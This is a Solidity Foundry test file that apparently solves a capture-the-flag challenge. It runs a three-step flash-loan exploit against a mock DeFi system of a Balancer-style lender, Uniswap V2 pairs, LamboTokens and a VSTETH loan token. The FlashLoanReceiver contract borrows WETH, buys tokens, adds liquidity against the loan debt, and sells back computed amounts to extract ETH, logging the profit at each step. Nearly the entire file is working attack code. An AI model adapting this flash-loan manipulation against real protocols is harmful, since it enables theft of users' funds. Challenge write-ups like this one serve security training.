pragma solidity ^0.8.20;

import {VasthavikamainaToken} from "src/core/VasthavikamainaToken.sol";
import {IUniswapV2Factory} from "src/uniswap-v2/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "src/uniswap-v2/interfaces/IUniswapV2Pair.sol";
import {WhiteListed} from "src/core/WhiteListed.sol";
import {Factory} from "src/core/Factory.sol";
import {Setup} from "src/core/Setup.sol";
import {Test,console} from "forge-std/Test.sol";
import {LamboToken} from "src/core/LamboToken.sol";
import {WETH9} from "src/core/WETH.sol";
import {Balancer, IFlashLoanRecipient} from "src/core/Balancer.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IuniswapFactory{
    function getBytecode()external returns (bytes32);
}


contract Solve is Test{
    address owner=makeAddr("OWNER");
    address LP=makeAddr("LIQUIDITY__PROVIDIER");
    VasthavikamainaToken public VSTETH;
    IUniswapV2Factory public uniswapV2Factory;
    WhiteListed public whiteListed;
    Factory public factory;
    WETH9 public wETH9;
    Balancer public _balancer;
    IUniswapV2Pair public uniPair1;
    IUniswapV2Pair public uniPair2;
    IUniswapV2Pair public uniPair3;
    LamboToken public lamboToken1;
    LamboToken public lamboToken2;
    LamboToken public lamboToken3;
    Setup public chall_Setup;
    uint256 _liquidityAmount = 32560203560896180352774;

    address _factory=address(0x5FbDB2315678afecb367f032d93F642f64180aa3);

    function setUp()public{
        startHoax(owner);
        chall_Setup =new Setup{value: 6.35 ether}(_factory);
        VSTETH=chall_Setup.VSTETH();
        uniswapV2Factory=chall_Setup.uniswapV2Factory();
        whiteListed=chall_Setup.whiteListed();
        factory=chall_Setup.factory();
        uniPair1=chall_Setup.uniPair1();
        uniPair2=chall_Setup.uniPair2();
        uniPair3=chall_Setup.uniPair3();
        lamboToken1=chall_Setup.lamboToken1();
        lamboToken2=chall_Setup.lamboToken2();
        lamboToken3=chall_Setup.lamboToken3();
        wETH9=chall_Setup.wETH9();
        _balancer=chall_Setup.balancer();
        bytes32 init_hash=IuniswapFactory(address(uniswapV2Factory)).getBytecode();
        whiteListed.setInitHash(init_hash);
        factory.setInitHash(init_hash);
        vm.stopPrank();
    }

    modifier depositInWETH(){
        startHoax(LP);
        wETH9.deposit{value: _liquidityAmount}(LP);
        wETH9.approve(address(_balancer), _liquidityAmount);
        _balancer.provideLiquidity(address(wETH9), _liquidityAmount);
        vm.stopPrank();
        _;
    }

    modifier maketxs(){
        startHoax(LP);
        uint256 _vETHBalanceTo_VETH_HBL=132534758877722247977 - (3.3 ether);
        whiteListed.buyQuote{value: _vETHBalanceTo_VETH_HBL}(address(lamboToken1), _vETHBalanceTo_VETH_HBL, 0);
        uint256 _vETHBalanceTo_VETH_CBO=5007791505809550535 - 0.05 ether;
        whiteListed.buyQuote{value:_vETHBalanceTo_VETH_CBO}(address(lamboToken2), _vETHBalanceTo_VETH_CBO, 0);
        uint256 _vETHBalanceTo_VETH_BIN=3852171628908871705- 3 ether;
        whiteListed.buyQuote{value: _vETHBalanceTo_VETH_BIN}(address(lamboToken3), _vETHBalanceTo_VETH_BIN, 0);
        vm.stopPrank();
        _;
    }


    function testSolve()public depositInWETH maketxs{
        vm.roll(1e18);
        IERC20[] memory _tokens=new IERC20[](1);
        uint256[] memory _amounts=new uint256[](1);
        _tokens[0]=IERC20(address(wETH9));
        _amounts[0]=_liquidityAmount;
        IUniswapV2Pair[] memory _unipairs=new IUniswapV2Pair[](3);
        LamboToken[] memory _lamboTokens=new LamboToken[](3);
        _lamboTokens[0]=lamboToken1;
        _lamboTokens[1]=lamboToken2;
        _lamboTokens[2]=lamboToken3;
        _unipairs[0]=uniPair1;
        _unipairs[1]=uniPair2;
        _unipairs[2]=uniPair3;
        FlashLoanReceiver _flashLoanReceiver=new FlashLoanReceiver(_unipairs,
                                                                    _lamboTokens,
                                                                    whiteListed,
                                                                    factory,
                                                                    wETH9,
                                                                    _balancer,
                                                                    VSTETH,
                                                                    chall_Setup
                                                                );
        bytes memory _data;
        _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
        vm.roll(1e18+1);
        _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
        vm.roll(1e18+2);
        _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
    }

        function testUnintendedSolve()public depositInWETH maketxs{
        vm.roll(1e18);
        IERC20[] memory _tokens=new IERC20[](1);
        uint256[] memory _amounts=new uint256[](1);
        _tokens[0]=IERC20(address(wETH9));
        _amounts[0]=_liquidityAmount;
        IUniswapV2Pair[] memory _unipairs=new IUniswapV2Pair[](3);
        LamboToken[] memory _lamboTokens=new LamboToken[](3);
        _lamboTokens[0]=lamboToken1;
        _lamboTokens[1]=lamboToken2;
        _lamboTokens[2]=lamboToken3;
        _unipairs[0]=uniPair1;
        _unipairs[1]=uniPair2;
        _unipairs[2]=uniPair3;
        address _player=makeAddr("PLAYER");
        FlashLoanReceiver _flashLoanReceiver=new FlashLoanReceiver(_unipairs,
                                                                    _lamboTokens,
                                                                    whiteListed,
                                                                    factory,
                                                                    wETH9,
                                                                    _balancer,
                                                                    VSTETH,
                                                                    chall_Setup
                                                                );
        bytes memory _data;
        _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
        vm.roll(1e18+1);
        _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
        vm.roll(1e18+2);
        _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
        chall_Setup.setPlayer(address(_flashLoanReceiver));
        bool isSolved=chall_Setup.isSolved();
        console.log(isSolved);
    }


}

contract FlashLoanReceiver is IFlashLoanRecipient {
    Setup setup;
    WhiteListed public whiteListed;
    Factory public factory;
    IUniswapV2Pair public uniPair1;
    IUniswapV2Pair public uniPair2;
    IUniswapV2Pair public uniPair3;
    LamboToken public lamboToken1;
    LamboToken public lamboToken2;
    LamboToken public lamboToken3;
    WETH9 public wETH9;
    Balancer public balancer;
    VasthavikamainaToken public VSTETH;
    uint8 state;
    address player;
    uint256 this_balance=0;
    constructor(IUniswapV2Pair[] memory _unipairs,
                LamboToken[] memory _lamboTokens,
                WhiteListed _whiteListed,
                Factory _factory,
                WETH9 _wETH9,
                Balancer _balancer,
                VasthavikamainaToken _VSTETH,
                Setup _setup
        ){
        setup=_setup;
        whiteListed=_whiteListed;
        factory=_factory;
        uniPair1=_unipairs[0];
        uniPair2=_unipairs[1];
        uniPair3=_unipairs[2];
        lamboToken1=_lamboTokens[0];
        lamboToken2=_lamboTokens[1];
        lamboToken3=_lamboTokens[2];
        wETH9=_wETH9;
        balancer=_balancer;
        VSTETH=_VSTETH;
        
    }



    function getAmountsIn(uint256 amountOut,uint256 reserveIn,uint256 reserveOut)internal pure returns(uint256 amountIn){
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint256 numerator= reserveIn*amountOut*1000;
        uint256 denominator= (reserveOut-amountOut)*997;
        amountIn=numerator/denominator;
    }

    function receiveFlashLoan(
        IERC20[] memory _tokens,
        uint256[] memory _amounts,
        uint256[] memory _feeAmounts,
        bytes memory _data
    ) external override {
        LamboToken lamboToken;
        IUniswapV2Pair uniPair;
        if(state==uint8(0)){
            state++;
            lamboToken=lamboToken1;
            uniPair=uniPair1;
            console.log("=================================================");
            console.log("                    STEP-1                       ");
        }else if(state==uint8(1)){
            state++;
            lamboToken=lamboToken2;
            uniPair=uniPair2;
            console.log("=================================================");
            console.log("                    STEP-2                       ");
        }else{
            state++;
            lamboToken=lamboToken3;
            uniPair=uniPair3;
            console.log("=================================================");
            console.log("                    STEP-3                       ");
        }
        IERC20 _token=_tokens[0];
        uint256 _amount=_amounts[0];
        wETH9.withdraw(address(this), _amount);
        uint256 _lamboOut=whiteListed.buyQuote{value:_amount}(address(lamboToken), _amount, 0);
        lamboToken.approve(address(factory), _lamboOut);
        uint256 _loanAmount=300e18;
        
        factory.addVasthavikamainaLiquidity(address(VSTETH), address(lamboToken), _loanAmount, _lamboOut);
        (uint256 _reserve0,uint256 _reserve1,)=uniPair.getReserves();
        address _token0=uniPair.token0();
        uint256 _netBalance;
        uint256 _amountIn;
        if(_token0==address(VSTETH)){
            uint256 _debtAmount=VSTETH.getLoanDebt(address(uniPair));
            _netBalance=_reserve0-_debtAmount;
            _amountIn=getAmountsIn(_netBalance, _reserve1, _reserve0);
        }else{
            uint256 _debtAmount=VSTETH.getLoanDebt(address(uniPair));
            _netBalance=_reserve1-_debtAmount;
            _amountIn=getAmountsIn(_netBalance, _reserve0, _reserve1);
        }
        lamboToken.approve(address(whiteListed), _amountIn);
        whiteListed.sellQuote(address(lamboToken), _amountIn, 0);
        wETH9.deposit{value: _amount}(address(this));
        wETH9.transfer(address(balancer), _amount);
        if(state==1){
            console.log("ETH PROFIT AFTER STEP1 :",address(this).balance - this_balance);
        }else if (state==2){
            console.log("ETH PROFIT AFTER STEP2 :",address(this).balance - this_balance);
        }else{
            console.log("ETH PROFIT AFTER STEP3 :",address(this).balance - this_balance);
        }
        this_balance=address(this).balance;
    }

    
    receive()external payable{
        
    }
}

